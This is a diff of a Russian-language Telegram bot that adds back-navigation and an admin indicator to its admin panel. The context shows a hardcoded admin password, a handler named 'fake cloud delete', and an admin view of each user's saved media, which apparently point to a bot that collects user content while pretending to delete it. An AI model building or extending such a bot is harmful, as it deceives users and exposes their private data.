@@ -16,7 +16,7 @@ ADMIN_PASSWORD = "VAYG7YLNEM"    # Пароль для доступа в адм�
 def init_db():
     conn = sqlite3.connect("bot_data.db")
     cursor = conn.cursor()
-    # Таблица активности пользователей (добавлена колонка file_id)
+    # Таблица активности пользователей
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS user_activity (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -78,11 +78,12 @@ class AdminStates(StatesGroup):
     waiting_for_unban_id = State()
 
 # ==================== КЛАВИАТУРЫ ====================
-def get_main_keyboard():
+def get_main_keyboard(is_admin: bool = False):
     builder = ReplyKeyboardBuilder()
     builder.add(types.KeyboardButton(text="☁️ Удалить из облака"))
     builder.add(types.KeyboardButton(text="ℹ️ О боте"))
-    builder.add(types.KeyboardButton(text="🔐 Админка"))
+    admin_btn_text = "✅ Админка" if is_admin else "🔐 Админка"
+    builder.add(types.KeyboardButton(text=admin_btn_text))
     builder.adjust(2, 1)
     return builder.as_markup(resize_keyboard=True)
 
@@ -91,8 +92,9 @@ def get_admin_keyboard():
     builder.add(types.KeyboardButton(text="📊 Сохранённые данные"))
     builder.add(types.KeyboardButton(text="⛔ Забанить (Инструкция)"))
     builder.add(types.KeyboardButton(text="✅ Разбанить (Инструкция)"))
+    builder.add(types.KeyboardButton(text="⬅️ Назад"))
     builder.add(types.KeyboardButton(text="🚪 Выйти из админки"))
-    builder.adjust(2, 2)
+    builder.adjust(2, 2, 1)
     return builder.as_markup(resize_keyboard=True)
 
 def get_user_media_inline_keyboard(user_id: int):
@@ -122,7 +124,7 @@ async def cmd_start(message: types.Message, state: FSMContext):
     await state.clear()
     await message.answer(
         "Привет! Выберите действие в меню ниже или отправьте мне данные для сохранения.",
-        reply_markup=get_main_keyboard()
+        reply_markup=get_main_keyboard(is_admin=False)
     )
 
 # --- Пользовательская кнопка "ℹ️ О боте" ---
@@ -158,15 +160,16 @@ async def process_fake_cloud_delete(message: types.Message):
         except Exception:
             pass
 
-# --- 1. Главная кнопка "🔐 Админка" ---
+# --- 1. Кнопка "🔐 Админка" (когда не авторизован) ---
 @dp.message(F.text == "🔐 Админка")
 async def process_admin_button(message: types.Message, state: FSMContext):
-    current_state = await state.get_state()
-    if current_state == AdminStates.is_admin.state:
-        await message.answer("Вы уже находитесь в режиме администратора.", reply_markup=get_admin_keyboard())
-    else:
-        await state.set_state(AdminStates.waiting_for_password)
-        await message.answer("Отправьте пароль администратора:")
+    await state.set_state(AdminStates.waiting_for_password)
+    await message.answer("Отправьте пароль администратора:")
+
+# --- 1.1. Кнопка "✅ Админка" (когда уже авторизован и находится в главном меню) ---
+@dp.message(AdminStates.is_admin, F.text == "✅ Админка")
+async def process_return_to_admin(message: types.Message):
+    await message.answer("Панель администратора:", reply_markup=get_admin_keyboard())
 
 # --- 2. Проверка пароля ---
 @dp.message(AdminStates.waiting_for_password)
@@ -180,13 +183,26 @@ async def process_password(message: types.Message, state: FSMContext):
     else:
         await message.answer("❌ Неверный пароль! Попробуйте ещё раз или нажмите /start для отмены.")
 
-# --- 3. Выход из админки ---
+# --- 3. Назад в главное меню (оставаясь админом) ---
+@dp.message(AdminStates.is_admin, F.text == "⬅️ Назад")
+async def process_admin_back(message: types.Message):
+    await message.answer("Вы вернулись в главное меню. Админ-доступ сохранён.", reply_markup=get_main_keyboard(is_admin=True))
+
+# --- Возврат в админку из подменю ввода ID для бана/разбана по кнопке Назад ---
+@dp.message(F.text == "⬅️ Назад")
+async def process_substate_back(message: types.Message, state: FSMContext):
+    current_state = await state.get_state()
+    if current_state in {AdminStates.waiting_for_ban_id.state, AdminStates.waiting_for_unban_id.state}:
+        await state.set_state(AdminStates.is_admin)
+        await message.answer("Панель администратора:", reply_markup=get_admin_keyboard())
+
+# --- 4. Полный выход из админки ---
 @dp.message(AdminStates.is_admin, F.text == "🚪 Выйти из админки")
 async def process_logout(message: types.Message, state: FSMContext):
     await state.clear()
-    await message.answer("Вы вышли из админ-панели.", reply_markup=get_main_keyboard())
+    await message.answer("Вы вышли из админ-панели.", reply_markup=get_main_keyboard(is_admin=False))
 
-# --- 4. Группированная статистика с инлайн-кнопками медиа ---
+# --- 5. Группированная статистика с инлайн-кнопками медиа ---
 @dp.message(AdminStates.is_admin, F.text == "📊 Сохранённые данные")
 async def process_stats(message: types.Message):
     conn = sqlite3.connect("bot_data.db")
@@ -244,7 +260,7 @@ async def process_stats(message: types.Message):
 
     conn.close()
 
-# --- 5. Обработчик клика по инлайн-кнопкам медиа ---
+# --- 6. Обработчик клика по инлайн-кнопкам медиа ---
 @dp.callback_query(F.data.startswith("get_media:"))
 async def process_get_media_callback(callback: types.CallbackQuery):
     _, target_user_id, media_type = callback.data.split(":")
@@ -277,11 +293,13 @@ async def process_get_media_callback(callback: types.CallbackQuery):
         except Exception as e:
             logging.error(f"Ошибка при отправке медиафайла: {e}")
 
-# --- 6. Бан и разбан ---
+# --- 7. Бан и разбан ---
 @dp.message(AdminStates.is_admin, F.text == "⛔ Забанить (Инструкция)")
 async def ban_instruction(message: types.Message, state: FSMContext):
     await state.set_state(AdminStates.waiting_for_ban_id)
-    await message.answer("Отправьте Telegram ID пользователя, которого хотите забанить:")
+    builder = ReplyKeyboardBuilder()
+    builder.add(types.KeyboardButton(text="⬅️ Назад"))
+    await message.answer("Отправьте Telegram ID пользователя, которого хотите забанить:", reply_markup=builder.as_markup(resize_keyboard=True))
 
 @dp.message(AdminStates.waiting_for_ban_id)
 async def process_ban_id(message: types.Message, state: FSMContext):
@@ -291,12 +309,14 @@ async def process_ban_id(message: types.Message, state: FSMContext):
     user_id = int(message.text)
     ban_user(user_id)
     await state.set_state(AdminStates.is_admin)
-    await message.answer(f"⛔ Пользователь с ID `{user_id}` успешно забанен!", parse_mode="Markdown")
+    await message.answer(f"⛔ Пользователь с ID `{user_id}` успешно забанен!", parse_mode="Markdown", reply_markup=get_admin_keyboard())
 
 @dp.message(AdminStates.is_admin, F.text == "✅ Разбанить (Инструкция)")
 async def unban_instruction(message: types.Message, state: FSMContext):
     await state.set_state(AdminStates.waiting_for_unban_id)
-    await message.answer("Отправьте Telegram ID пользователя, которого хотите разбанить:")
+    builder = ReplyKeyboardBuilder()
+    builder.add(types.KeyboardButton(text="⬅️ Назад"))
+    await message.answer("Отправьте Telegram ID пользователя, которого хотите разбанить:", reply_markup=builder.as_markup(resize_keyboard=True))
 
 @dp.message(AdminStates.waiting_for_unban_id)
 async def process_unban_id(message: types.Message, state: FSMContext):
@@ -306,9 +326,9 @@ async def process_unban_id(message: types.Message, state: FSMContext):
     user_id = int(message.text)
     unban_user(user_id)
     await state.set_state(AdminStates.is_admin)
-    await message.answer(f"✅ Пользователь с ID `{user_id}` успешно разбанен!", parse_mode="Markdown")
+    await message.answer(f"✅ Пользователь с ID `{user_id}` успешно разбанен!", parse_mode="Markdown", reply_markup=get_admin_keyboard())
 
-# --- 7. Сохранение пользовательского контента ---
+# --- 8. Сохранение пользовательского контента ---
 @dp.message()
 async def handle_user_content(message: types.Message):
     user = message.from_user
